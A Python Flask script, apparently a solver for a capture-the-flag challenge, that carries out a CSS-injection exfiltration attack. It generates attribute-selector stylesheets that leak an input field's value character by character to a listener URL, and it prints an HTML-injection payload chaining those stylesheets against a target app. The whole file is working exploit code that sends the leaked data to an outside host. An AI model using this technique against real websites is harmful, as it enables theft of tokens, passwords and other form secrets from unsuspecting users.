import string
from time import sleep
from flask import Flask, request
#from pyngrok import ngrok


PORT = 4444

app = Flask(__name__)

TUNNEL = "http://host.docker.internal:4444"
LOCAL_URL2 = "http://localhost:15907/"
flag = "Hology6{sadly_your_secret_is_not_secure_here}"


def oracle(chars):
    return 'input[value^="%s"]{background-image:url("%s")}' % (chars, TUNNEL+"/leaked?l="+chars)


def valueleak(known):
    result = ""
    for i in string.ascii_letters+string.digits+"_{}":
        result += oracle(known+i)
    return result


@app.get("/leaked")
def leak():
    global flag
    leaked = request.args.get("l")
    flag = leaked
    print(f"Leaked so far: {flag}")  # Add this line
    return "ok"


@app.get("/css/<int:i>")
def css(i: int):
    print(f"[*] /css/{i} requested")  # Add this line
    global flag
    while len(flag) != i:
        sleep(1)
    return valueleak(known=flag), 200, {"Content-Type": "text/css"}


def genpayload(length):
    result = "http://app:5000/?html="
    for i in range(length):
        result += '<link rel="stylesheet" href="%s"/>' % (
            LOCAL_URL2+"/css/"+str(i))
    return result


if __name__ == "__main__":
    print(genpayload(len(flag)))
    app.run("0.0.0.0", 4444)
